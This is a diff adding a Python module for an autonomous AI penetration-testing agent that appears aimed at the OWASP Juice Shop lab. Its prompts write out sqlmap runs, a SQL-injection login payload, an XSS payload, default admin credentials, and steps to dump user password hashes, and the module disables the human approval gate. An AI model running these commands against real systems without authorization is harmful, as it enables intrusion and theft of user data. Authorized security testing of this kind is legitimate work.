@@ -1,0 +1,808 @@
+"""CVA Auto Mode — fully autonomous VAPT with real-time streaming output.
+
+Architecture (CAI-inspired):
+    Single ReAct agent with ALL tools. The agent loops automatically:
+    LLM → tool call → result → LLM → tool call → result → ...
+    until it decides it's done.
+
+    No per-phase specialist agents. One agent controls the whole engagement,
+    just like CAI's one_tool_agent pattern. The system prompt gives it full
+    VAPT methodology and it self-directs through all phases.
+
+    Real-time streaming shows every thought, tool call, and result as they
+    happen via stream_mode='messages'.
+"""
+
+import os
+import sys
+import re
+import time
+import json
+import threading
+import traceback
+from datetime import datetime, timezone
+from typing import Optional, List, Dict
+from concurrent.futures import ThreadPoolExecutor, Future
+
+from rich.console import Console
+from rich.panel import Panel
+from rich.text import Text
+from rich.rule import Rule
+from rich.table import Table
+from rich.markup import escape
+from rich import box
+
+from langchain_core.messages import (
+    AIMessage, HumanMessage, SystemMessage, ToolMessage, BaseMessage,
+)
+
+from src.config import settings
+from src.brain.thinking import parse_thinking, strip_thinking
+from src.brain.llm_provider import get_llm
+from src.reporting.generator import ReportGenerator, Finding
+from src.memory.session_logger import SessionLogger
+
+console = Console(highlight=False)
+
+
+# ── Styles ───────────────────────────────────────────────────────────────────
+
+SEVERITY_STYLES = {
+    "critical": "bold red",
+    "high":     "bold bright_red",
+    "medium":   "bold yellow",
+    "low":      "bold blue",
+    "info":     "dim white",
+}
+
+
+# ── Background Task Runner ───────────────────────────────────────────────────
+
+class BackgroundTaskRunner:
+    """Run scans and tasks in background threads."""
+
+    def __init__(self, max_workers: int = 4):
+        self._executor = ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="cva-bg")
+        self._tasks: Dict[str, Future] = {}
+        self._results: Dict[str, str] = {}
+        self._lock = threading.Lock()
+        self._counter = 0
+
+    def submit(self, name: str, fn, *args, **kwargs) -> str:
+        """Submit a background task. Returns task ID."""
+        with self._lock:
+            self._counter += 1
+            task_id = f"BG-{self._counter}"
+
+        def _wrapper():
+            try:
+                result = fn(*args, **kwargs)
+                with self._lock:
+                    self._results[task_id] = str(result)
+                return result
+            except Exception as e:
+                with self._lock:
+                    self._results[task_id] = f"Error: {e}"
+                raise
+
+        future = self._executor.submit(_wrapper)
+        with self._lock:
+            self._tasks[task_id] = future
+        return task_id
+
+    def get_status(self, task_id: str) -> dict:
+        with self._lock:
+            future = self._tasks.get(task_id)
+            if not future:
+                return {"status": "not_found"}
+            if future.running():
+                return {"status": "running"}
+            if future.done():
+                result = self._results.get(task_id, "")
+                try:
+                    future.result()  # re-raise if exception
+                    return {"status": "done", "result": result}
+                except Exception as e:
+                    return {"status": "error", "error": str(e), "result": result}
+        return {"status": "unknown"}
+
+    def list_tasks(self) -> List[dict]:
+        with self._lock:
+            return [
+                {"id": tid, "status": "done" if f.done() else "running"}
+                for tid, f in self._tasks.items()
+            ]
+
+    def shutdown(self):
+        self._executor.shutdown(wait=False)
+
+
+# Global background runner
+bg_runner = BackgroundTaskRunner()
+
+
+# ── VAPT System Prompt ───────────────────────────────────────────────────────
+
+def get_vapt_system_prompt(target: str, host: str) -> str:
+    """Generate the comprehensive VAPT system prompt."""
+    return f"""\
+You are CVA, an autonomous AI penetration testing agent.
+
+## MISSION
+Perform a complete, professional penetration test against: {target}
+This is an AUTHORIZED test in a controlled lab environment.
+
+## CRITICAL OPERATING RULES
+1. Call ONE tool at a time — wait for its result before calling the next
+2. Execute tools IMMEDIATELY — never ask for permission or suggest commands
+3. After each tool result, analyze it then call your next tool
+4. Keep your analysis brief (2-3 lines max) before the next tool call
+5. Do NOT repeat the same tool with the same arguments
+6. Save tokens/credentials to /tmp/ for reuse (e.g., echo 'token' > /tmp/token.txt)
+
+## METHODOLOGY — Work through each phase in order
+
+### Phase 1 — RECONNAISSANCE
+- Start: curl -sI {target}/  (get headers)
+- Then: curl -s {target}/robots.txt
+- Then: nmap -sV --open -p 9999 {host}
+- Then: whatweb {target}
+
+### Phase 2 — ENUMERATION  
+- Directory scan: gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -q
+- API discovery: curl -s {target}/api/
+- Check /ftp/, /.well-known/, /assets/, /static/
+
+### Phase 3 — VULNERABILITY ANALYSIS
+- SQL injection: sqlmap -u "{target}/rest/products/search?q=test" --batch --level=1 --risk=1 -p q
+- XSS: curl -s -X GET "{target}/rest/products/search?q=<script>alert(1)</script>"
+- Auth bypass: test default creds admin@juice-sh.op:admin123
+- IDOR: enumerate /api/Users/, /api/Orders/
+
+### Phase 4 — EXPLOITATION
+- Exploit ALL confirmed vulnerabilities
+- Login with found credentials via POST /rest/user/login
+- Capture JWT tokens and use them to access admin endpoints
+- Document exact curl commands and responses as evidence
+
+### Phase 5 — POST-EXPLOITATION
+- Use JWT token to access: /api/Users/ (admin only)
+- Try /rest/admin/application-configuration
+- Enumerate all users and their data
+
+### Phase 6 — REPORTING
+When all exploitation is complete, say "GENERATING FINAL REPORT" and summarize:
+- All vulnerabilities with severity (CRITICAL/HIGH/MEDIUM/LOW)
+- Evidence for each finding
+- Remediation recommendations
+
+## TARGET
+- URL: {target}
+- Host: {host}
+
+Start with Phase 1. Call your FIRST tool NOW.
+"""
+
+
+
+# ── Auto Runner ──────────────────────────────────────────────────────────────
+
+class AutoRunner:
+    """Drives the fully autonomous VAPT pipeline.
+
+    Architecture: Single create_react_agent with ALL tools.
+    The agent self-directs through all VAPT phases. We stream every
+    message (thinking, tool calls, results, analysis) in real time.
+    """
+
+    def __init__(self, target: str, tools: list, model_override: str = None,
+                 orchestrator=None, report_gen=None, session_logger=None):
+        self.target = target.rstrip("/")
+        self.host = self._extract_host(target)
+        self.tools = tools
+        self.start_time = time.time()
+        self.tool_call_count = 0
+        self.findings: List[Finding] = []
+        self._stop = False
+        self.current_phase = "reconnaissance"
+
+        # Use existing subsystems if provided (from /auto command)
+        self.report_gen = report_gen or ReportGenerator()
+        self.report_gen.target = self.target
+        self.report_gen.tester = "CVA v3 Auto Mode"
+        self.session_logger = session_logger or SessionLogger()
+
+        # Configure settings for auto mode
+        settings.require_approval = False
+
+        if model_override:
+            parts = model_override.split(":", 1)
+            provider = parts[0]
+            model = parts[1] if len(parts) > 1 else None
+            settings.llm_provider = provider
+            if model and provider == "ollama":
+                settings.ollama_model = model
+            elif model and provider == "openai":
+                settings.openai_model = model
+
+        # Build the single react agent
+        self._build_agent()
+
+    def _extract_host(self, target: str) -> str:
+        from urllib.parse import urlparse
+        parsed = urlparse(target)
+        return parsed.hostname or target
+
+    def _build_agent(self):
+        """Build a single create_react_agent with all tools.
+
+        Wraps each tool to truncate its output before it goes back into
+        the LLM context — prevents context window overflow on large scans.
+        """
+        from langgraph.prebuilt import create_react_agent
+        from langgraph.checkpoint.memory import MemorySaver
+        from langchain_core.tools import BaseTool, tool as tool_decorator
+
+        self.llm = get_llm()
+        system_prompt = get_vapt_system_prompt(self.target, self.host)
+        self.checkpointer = MemorySaver()
+
+        def _trim_tool_messages(state: dict) -> dict:
+            """Trim large tool outputs before LLM call to prevent context overflow.
+
+            pre_model_hook receives the full graph state and must return a dict
+            with a 'messages' key containing the (possibly modified) message list.
+            """
+            messages = state.get("messages", [])
+            trimmed = []
+            for m in messages:
+                if isinstance(m, ToolMessage):
+                    content = m.content if isinstance(m.content, str) else str(m.content)
+                    if len(content) > 3000:
+                        head = content[:1500]
+                        tail = content[-750:]
+                        omitted = len(content) - len(head) - len(tail)
+                        content = (
+                            f"{head}\n\n[... {omitted} chars trimmed to save context ...]\n\n{tail}"
+                        )
+                    trimmed.append(ToolMessage(
+                        content=content,
+                        tool_call_id=m.tool_call_id,
+                        name=getattr(m, "name", "tool"),
+                    ))
+                else:
+                    trimmed.append(m)
+            return {"messages": trimmed}
+
+        self.agent = create_react_agent(
+            self.llm,
+            tools=self.tools,
+            checkpointer=self.checkpointer,
+            prompt=system_prompt,
+            pre_model_hook=_trim_tool_messages,
+        )
+        self.thread_id = f"auto_{int(time.time())}"
+
+    def _cap_output(self, raw) -> str:
+        """Truncate tool output to avoid LLM context overflow."""
+        MAX = 3000
+        text = raw if isinstance(raw, str) else str(raw)
+        if len(text) <= MAX:
+            return text
+        head = text[:MAX // 2]
+        tail = text[-(MAX // 4):]
+        omitted = len(text) - len(head) - len(tail)
+        return f"{head}\n\n[... {omitted} chars omitted for brevity ...]\n\n{tail}"
+
+
+    # ── Display Helpers ───────────────────────────────────────────────────
+
+    def _print_banner(self):
+        console.print()
+        table = Table(show_header=False, box=box.DOUBLE, border_style="bold cyan",
+                      width=70, padding=(0, 2))
+        table.add_column(justify="center")
+        table.add_row(Text("CVA — Cognitive VAPT Assistant v3", style="bold white"))
+        table.add_row(Text("◆  AUTONOMOUS MODE  ◆", style="bold yellow"))
+        table.add_row(Text(f"Target: {self.target}", style="bold cyan"))
+        table.add_row(Text(f"Model:  {settings.llm_provider}:{getattr(settings, f'{settings.llm_provider}_model', settings.ollama_model)}", style="dim white"))
+        table.add_row(Text(f"Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", style="dim white"))
+        console.print(table, justify="center")
+        console.print()
+
+    def _print_phase(self, phase_name: str, phase_num: int):
+        """Print phase transition banner."""
+        styles = {
+            "reconnaissance": "bold cyan", "enumeration": "bold blue",
+            "vulnerability": "bold yellow", "exploitation": "bold red",
+            "post-exploitation": "bold magenta", "reporting": "bold green",
+        }
+        style = styles.get(phase_name.lower(), "bold white")
+        console.print()
+        console.print(Rule(
+            f"[{style}] PHASE {phase_num}: {phase_name.upper()} [{style}]",
+            style=style
+        ))
+        console.print()
+        self.current_phase = phase_name
+
+    def _print_thinking(self, text: str):
+        if not text.strip():
+            return
+        truncated = text[:2000]
+        if len(text) > 2000:
+            truncated += f"\n... [{len(text) - 2000} chars truncated]"
+        panel = Panel(
+            Text(truncated, style="dim italic white"),
+            title="[dim yellow]💭 Thinking[/dim yellow]",
+            border_style="dim yellow",
+            padding=(0, 1),
+        )
+        console.print(panel)
+
+    def _print_tool_call(self, tool_name: str, args: dict):
+        self.tool_call_count += 1
+        args_display = ""
+        for k, v in args.items():
+            v_str = str(v)
+            if len(v_str) > 200:
+                v_str = v_str[:200] + "..."
+            args_display += f"  [dim white]{k}[/dim white]=[cyan]{escape(v_str)}[/cyan]\n"
+
+        console.print(
+            f"\n  [bold cyan]┌─ TOOL #{self.tool_call_count}: {tool_name} ──────────────────────[/bold cyan]"
+        )
+        if args_display:
+            for line in args_display.strip().split("\n"):
+                console.print(f"  [dim white]│[/dim white] {line}")
+
+    def _print_tool_output(self, tool_name: str, output: str):
+        lines = output.strip().split("\n")
+        max_lines = 50
+        display_lines = lines[:max_lines]
+
+        console.print(f"  [bold cyan]└─ OUTPUT ({len(lines)} lines, {len(output)} bytes)[/bold cyan]")
+
+        for line in display_lines:
+            stripped = line.strip()
+            if any(k in stripped.lower() for k in ["error", "fail", "denied"]):
+                console.print(f"    [dim red]{escape(line)}[/dim red]")
+            elif any(k in stripped.lower() for k in ["password", "token", "secret", "admin", "auth"]):
+                console.print(f"    [bold yellow]{escape(line)}[/bold yellow]")
+            elif any(k in stripped.lower() for k in ["open", "found", "success", "200", "vulner"]):
+                console.print(f"    [bold green]{escape(line)}[/bold green]")
+            else:
+                console.print(f"    [white]{escape(line)}[/white]")
+
+        if len(lines) > max_lines:
+            console.print(f"    [dim white]... ({len(lines) - max_lines} more lines hidden)[/dim white]")
+        console.print()
+
+    def _print_ai_response(self, content: str):
+        if not content.strip():
+            return
+        truncated = content[:4000]
+        if len(content) > 4000:
+            truncated += f"\n\n[{len(content) - 4000} more chars...]"
+        panel = Panel(
+            Text(truncated, style="white"),
+            title="[bold green]🤖 CVA ANALYSIS[/bold green]",
+            border_style="green",
+            padding=(0, 1),
+        )
+        console.print(panel)
+
+    def _print_status_bar(self):
+        elapsed = time.time() - self.start_time
+        mins = int(elapsed // 60)
+        secs = int(elapsed % 60)
+        console.print(
+            f"  [dim white]⏱ {mins:02d}:{secs:02d} │ "
+            f"Phase: [bold]{self.current_phase.title()}[/bold] │ "
+            f"Tools: {self.tool_call_count} │ "
+            f"Findings: {len(self.findings)}[/dim white]"
+        )
+
+    def _print_finding(self, finding: Finding):
+        sty = SEVERITY_STYLES.get(finding.severity, "white")
+        console.print(f"\n  🔴 FINDING [{sty}][{finding.severity.upper()}][/{sty}]: "
+                      f"[bold white]{escape(finding.title)}[/bold white]")
+
+    # ── Phase detection from agent output ─────────────────────────────────
+
+    def _detect_phase(self, text: str):
+        """Detect phase transitions from the agent's output."""
+        lower = text.lower()
+        phase_signals = [
+            (2, "enumeration", ["phase 2", "enumeration", "directory brute", "gobuster", "ffuf"]),
+            (3, "vulnerability", ["phase 3", "vulnerability analysis", "vuln scan", "sql injection test", "xss test"]),
+            (4, "exploitation", ["phase 4", "exploitation", "exploiting", "confirmed exploit"]),
+            (5, "post-exploitation", ["phase 5", "post-exploitation", "post exploitation", "privilege escalation"]),
+            (6, "reporting", ["phase 6", "generating final report", "report", "remediation"]),
+        ]
+        for num, name, keywords in phase_signals:
+            if any(kw in lower for kw in keywords):
+                if name != self.current_phase:
+                    self._print_phase(name, num)
+                break
+
+    # ── Finding extraction from agent output ──────────────────────────────
+
+    def _extract_findings(self, text: str):
+        """Parse findings from the agent's analysis text."""
+        lower = text.lower()
+
+        finding_patterns = [
+            # (keyword match, severity, title template)
+            (["sql injection", "sqli", "authentication bypass"], "critical",
+             "SQL Injection"),
+            (["xss", "cross-site scripting", "script injection"], "high",
+             "Cross-Site Scripting (XSS)"),
+            (["sensitive file", "file exposure", "/ftp/", "directory listing"], "high",
+             "Sensitive File Exposure"),
+            (["broken access control", "idor", "unauthorized access", "unauthenticated"], "high",
+             "Broken Access Control"),
+            (["default credential", "admin123", "weak password"], "medium",
+             "Default/Weak Credentials"),
+            (["information disclosure", "stack trace", "verbose error", "debug info"], "low",
+             "Information Disclosure"),
+            (["jwt", "token", "forged token"], "high",
+             "JWT/Token Vulnerability"),
+            (["ssrf", "server-side request"], "high",
+             "Server-Side Request Forgery"),
+            (["directory traversal", "path traversal", "lfi", "local file inclusion"], "high",
+             "Path Traversal / LFI"),
+            (["rce", "remote code execution", "command injection"], "critical",
+             "Remote Code Execution"),
+        ]
+
+        for keywords, severity, title in finding_patterns:
+            # Only add if confirmed (vulnerable, success, confirmed, exploited)
+            confirms = ["vulnerable", "success", "confirmed", "exploited",
+                         "obtained", "bypass"]
+            has_keyword = any(kw in lower for kw in keywords)
+            has_confirm = any(cf in lower for cf in confirms)
+
+            if has_keyword and has_confirm:
+                # Don't add duplicate findings
+                existing = {f.title for f in self.findings}
+                if title not in existing:
+                    # Try to extract evidence from nearby text
+                    evidence = ""
+                    for kw in keywords:
+                        idx = lower.find(kw)
+                        if idx >= 0:
+                            start = max(0, idx - 100)
+                            end = min(len(text), idx + 300)
+                            evidence = text[start:end].strip()
+                            break
+
+                    finding = Finding(
+                        title=title,
+                        severity=severity,
+                        description=f"Detected during autonomous VAPT of {self.target}",
+                        evidence=evidence[:500],
+                        remediation="See detailed report.",
+                        tool="CVA-Auto",
+                        category=title.split("(")[0].strip() if "(" in title else title,
+                    )
+                    self.findings.append(finding)
+                    self.report_gen.add_finding(finding)
+                    self._print_finding(finding)
+
+    def _looks_like_hallucinated_calls(self, text: str) -> bool:
+        """Detect if the LLM wrote tool call JSON as text instead of calling tools."""
+        indicators = [
+            '"name": "execute_shell_command"',
+            '"name": "execute_sandboxed_script"',
+            '{"name": "execute_',
+            'function call',
+            'function calls:',
+        ]
+        lower = text.lower()
+        return any(ind.lower() in lower for ind in indicators)
+
+    # ── Core Streaming Loop ───────────────────────────────────────────────
+
+    def _stream_run(self, prompt: str) -> str:
+        """Run the react agent and stream ALL output in real time.
+
+        Uses stream_mode='updates' which yields completed node outputs:
+        - 'agent' node → AI response + tool_calls list
+        - 'tools' node → ToolMessage results
+
+        More reliable than 'messages' mode because we get complete,
+        final messages rather than partial chunks requiring reassembly.
+        """
+        config = {"configurable": {"thread_id": self.thread_id}}
+        all_content = []
+
+        try:
+            stream = self.agent.stream(
+                {"messages": [HumanMessage(content=prompt)]},
+                config=config,
+                stream_mode="updates",
+            )
+
+            for update in stream:
+                if self._stop:
+                    break
+
+                # Each update is a dict: {node_name: {messages: [...]}}
+                for node_name, node_state in update.items():
+                    messages = node_state.get("messages", [])
+
+                    for msg in messages:
+                        if isinstance(msg, AIMessage):
+                            content = msg.content
+                            actual_calls = (msg.tool_calls
+                                           if hasattr(msg, "tool_calls") and msg.tool_calls
+                                           else [])
+
+                            if isinstance(content, str) and content.strip():
+                                parsed = parse_thinking(content)
+                                if parsed.thinking and parsed.thinking.strip():
+                                    self._print_thinking(parsed.thinking)
+                                clean = parsed.content.strip()
+                                if clean:
+                                    # Warn if model described tool calls as text
+                                    if not actual_calls and self._looks_like_hallucinated_calls(clean):
+                                        console.print(
+                                            "\n  [bold red]⚠ WARNING: Model wrote tool calls as text "
+                                            "instead of executing them (hallucination).[/bold red]\n"
+                                            "  [yellow]Consider switching model: --model ollama:qwen3:8b[/yellow]"
+                                        )
+                                    self._print_ai_response(clean)
+                                    all_content.append(clean)
+                                    self._detect_phase(clean)
+                                    self._extract_findings(clean)
+
+                            # Show actual tool calls the LLM made (before execution)
+                            for tc in actual_calls:
+                                name = tc.get("name", "")
+                                args = tc.get("args", {})
+                                if name:
+                                    self._print_tool_call(name, args)
+
+                        elif isinstance(msg, ToolMessage):
+                            tool_name = getattr(msg, "name", "tool")
+                            output = msg.content or ""
+                            self._print_tool_output(tool_name, output)
+                            self.session_logger.log_tool_result(tool_name, output)
+                            self._print_status_bar()
+                            self._extract_findings(output)
+                            self.report_gen.add_evidence(tool_name, tool_name, output[:2000])
+
+        except KeyboardInterrupt:
+            console.print("\n  [yellow]Interrupted by user — finishing...[/yellow]")
+            self._stop = True
+        except Exception as e:
+            console.print(f"\n  [red]Stream error: {e}[/red]")
+            if settings.debug_mode:
+                traceback.print_exc()
+
+        return "\n\n".join(all_content)
+
+    # ── Report Generation ─────────────────────────────────────────────────
+
+    def _generate_report(self) -> str:
+        """Generate the final report from discovered findings."""
+        console.print()
+        console.print(Rule("[bold green] PHASE 6: REPORTING [/bold green]", style="bold green"))
+        console.print()
+
+        if not self.findings:
+            console.print("  [yellow]No findings were automatically extracted.[/yellow]")
+            console.print("  [yellow]Generating report from agent conversation...[/yellow]")
+
+        os.makedirs("reports", exist_ok=True)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        # Generate executive summary via the agent
+        summary_prompt = f"""Based on all the testing you've performed against {self.target},
+write a PROFESSIONAL EXECUTIVE SUMMARY for a penetration test report.
+
+Include:
+1. Overall security posture assessment (2-3 sentences for management)
+2. Summary table of findings by severity (Critical/High/Medium/Low counts)
+3. Top 3 immediate remediation priorities
+4. Overall risk rating: CRITICAL / HIGH / MEDIUM / LOW
+
+List EVERY vulnerability you confirmed with its severity, CVSS score, and one-line description.
+Be concise, factual, and professional."""
+
+        console.print("  [bold yellow]◆ Generating executive summary...[/bold yellow]\n")
+        exec_summary = self._stream_run(summary_prompt)
+
+        # Build report
+        md_content = self.report_gen.generate_markdown()
+        clean_summary = strip_thinking(exec_summary)
+        md_content += f"\n\n## Executive Summary\n\n{clean_summary}"
+
+        md_path = f"reports/auto_{ts}.md"
+        html_path = f"reports/auto_{ts}.html"
+
+        with open(md_path, "w") as f:
+            f.write(md_content)
+        console.print(f"  [bold green]✓ Markdown report:[/bold green] [cyan]{md_path}[/cyan]")
+
+        try:
+            html_content = self.report_gen.generate_html()
+            with open(html_path, "w") as f:
+                f.write(html_content)
+            console.print(f"  [bold green]✓ HTML report:[/bold green] [cyan]{html_path}[/cyan]")
+        except Exception as e:
+            console.print(f"  [yellow]HTML report failed: {e}[/yellow]")
+            html_path = None
+
+        console.print(f"  [dim white]  Findings: {len(self.report_gen.findings)} | "
+                      f"Evidence items: {len(self.report_gen.raw_evidence)}[/dim white]")
+
+        return md_path
+
+    # ── Main Entry Point ──────────────────────────────────────────────────
+
+    def run(self) -> str:
+        """Run the full autonomous VAPT pipeline."""
+        self._print_banner()
+
+        console.print(Rule("[bold cyan]INITIALISING[/bold cyan]", style="cyan"))
+        console.print(f"  [cyan]Tools loaded:[/cyan] {len(self.tools)}")
+        for t in self.tools:
+            console.print(f"    • {t.name}")
+        console.print(f"  [cyan]Guardrails:[/cyan] {'enabled' if settings.guardrails_enabled else 'disabled'}")
+        console.print(f"  [cyan]Approval gate:[/cyan] DISABLED (auto mode)")
+        console.print()
+
+        # Phase 1 - Start with the full VAPT prompt
+        self._print_phase("Reconnaissance", 1)
+
+        initial_prompt = f"""BEGIN the penetration test against {self.target}.
+
+Start with Phase 1 — Reconnaissance. Execute these commands NOW:
+1. whatweb {self.target}
+2. nmap -sV -sC -p 80,443,8080,8443,9999 {self.host}
+3. curl -sI {self.target}/
+4. curl -s {self.target}/robots.txt
+
+After recon, proceed immediately to enumeration, then vulnerability analysis,
+then exploitation, then post-exploitation.
+
+Work through ALL phases without stopping. Execute tools immediately."""
+
+        response = self._stream_run(initial_prompt)
+
+        # Continue driving the agent through remaining phases if it stopped
+        phase_prompts = [
+            (2, "Enumeration", f"Continue to Phase 2 — ENUMERATION. Execute:\n"
+             f"1. gobuster dir -u {self.target} -w /usr/share/wordlists/dirb/common.txt -q --no-error -t 20 2>&1 | head -40\n"
+             f"2. curl -s {self.target}/ftp/ | head -30\n"
+             f"3. curl -s {self.target}/api/Products | python3 -c \"import sys,json; d=json.load(sys.stdin); print(len(d.get('data',[])), 'products')\"\n"
+             f"4. curl -s {self.target}/api/Challenges | python3 -c \"import sys,json; d=json.load(sys.stdin); print(len(d.get('data',[])), 'challenges')\"\n"),
+
+            (3, "Vulnerability Analysis", f"Continue to Phase 3 — VULNERABILITY ANALYSIS. Test:\n"
+             f"1. SQL Injection: curl -sX POST {self.target}/rest/user/login -H 'Content-Type: application/json' "
+             f"-d '{{\"email\":\"\\' OR 1=1--\",\"password\":\"x\"}}'\n"
+             f"2. XSS: curl -s '{self.target}/rest/products/search?q=<script>alert(1)</script>'\n"
+             f"3. File exposure: curl -s {self.target}/ftp/acquisitions.md | head -20\n"
+             f"4. Default creds: curl -sX POST {self.target}/rest/user/login -H 'Content-Type: application/json' "
+             f"-d '{{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}}'\n"
+             f"5. IDOR: curl -s {self.target}/api/Users | python3 -c \"import sys,json; print(len(json.load(sys.stdin).get('data',[])), 'users accessible')\"\n"
+             f"\nState VULNERABLE or NOT for each test."),
+
+            (4, "Exploitation", f"Continue to Phase 4 — EXPLOITATION. Exploit all confirmed vulnerabilities:\n"
+             f"1. SQLi admin bypass — capture and save the JWT token\n"
+             f"2. Access all exposed files in /ftp/\n"
+             f"3. Use admin token for privileged API access\n"
+             f"Mark each as CONFIRMED EXPLOITED or FAILED.\n"),
+
+            (5, "Post-Exploitation", f"Continue to Phase 5 — POST-EXPLOITATION:\n"
+             f"1. Use admin token to enumerate ALL users (email, role, password hash)\n"
+             f"2. Access application secrets/configuration\n"
+             f"3. Summarize: what data was compromised, what's the business impact\n"
+             f"4. Rate the overall severity of the breach\n"),
+        ]
+
+        for phase_num, phase_name, prompt in phase_prompts:
+            if self._stop:
+                break
+            # Check if agent already covered this phase
+            if self.current_phase in ("reporting",):
+                break
+
+            self._print_phase(phase_name, phase_num)
+            self._stream_run(prompt)
+
+        # Generate report
+        if not self._stop:
+            report_path = self._generate_report()
+        else:
+            report_path = "reports/interrupted.md"
+
+        # Final summary
+        elapsed = time.time() - self.start_time
+        mins = int(elapsed // 60)
+        secs = int(elapsed % 60)
+
+        console.print()
+        console.print(Rule("[bold green]VAPT COMPLETE[/bold green]", style="bold green"))
+        console.print()
+
+        summary = Table(show_header=True, box=box.ROUNDED, border_style="green",
+                        title="[bold green]Engagement Summary[/bold green]")
+        summary.add_column("Metric", style="bold white")
+        summary.add_column("Value", style="cyan")
+        summary.add_row("Target", self.target)
+        summary.add_row("Duration", f"{mins}m {secs}s")
+        summary.add_row("Tool Calls", str(self.tool_call_count))
+        summary.add_row("Findings", str(len(self.findings)))
+        summary.add_row("Critical", str(sum(1 for f in self.findings if f.severity == "critical")))
+        summary.add_row("High", str(sum(1 for f in self.findings if f.severity == "high")))
+        summary.add_row("Medium", str(sum(1 for f in self.findings if f.severity == "medium")))
+        summary.add_row("Low", str(sum(1 for f in self.findings if f.severity == "low")))
+        summary.add_row("Report", report_path)
+        console.print(summary)
+        console.print()
+
+        return report_path
+
+
+# ── Public Entry Points ──────────────────────────────────────────────────────
+
+def run_auto(target: str, model: str = None):
+    """Entry point for --auto CLI flag."""
+    from src.tools.mcp_client import get_mcp_tools
+    from src.tools.shell_session import get_session_tools, shutdown_all
+
+    console.print(Rule("[cyan]Loading Tools[/cyan]", style="cyan"))
+
+    tools = []
+    try:
+        mcp = get_mcp_tools()
+        tools.extend(mcp)
+        console.print(f"  ✓ MCP tools: {[t.name for t in mcp]}")
+    except Exception as e:
+        console.print(f"  [yellow]MCP tools failed: {e}[/yellow]")
+
+    sess = get_session_tools()
+    tools.extend(sess)
+    console.print(f"  ✓ Session tools: {[t.name for t in sess]}")
+
+    if not tools:
+        console.print("[red]Fatal: No tools loaded.[/red]")
+        sys.exit(1)
+
+    runner = AutoRunner(target=target, tools=tools, model_override=model)
+
+    import atexit
+    atexit.register(shutdown_all)
+
+    try:
+        report = runner.run()
+        console.print(f"\n[bold green]✓ Report saved:[/bold green] [cyan]{report}[/cyan]\n")
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Auto mode interrupted by user.[/yellow]")
+        shutdown_all()
+
+
+def run_auto_from_interactive(target: str, tools: list, orchestrator=None,
+                               report_gen=None, session_logger=None):
+    """Entry point for /auto slash command within interactive mode.
+
+    Runs in the CURRENT thread (blocks the interactive loop until done).
+    Uses the same tools already loaded by the interactive session.
+    """
+    runner = AutoRunner(
+        target=target,
+        tools=tools,
+        report_gen=report_gen,
+        session_logger=session_logger,
+    )
+
+    try:
+        report = runner.run()
+        return f"✓ Autonomous VAPT complete. Report: {report}"
+    except KeyboardInterrupt:
+        return "Auto mode interrupted by user."
+    except Exception as e:
+        return f"Auto mode error: {e}"
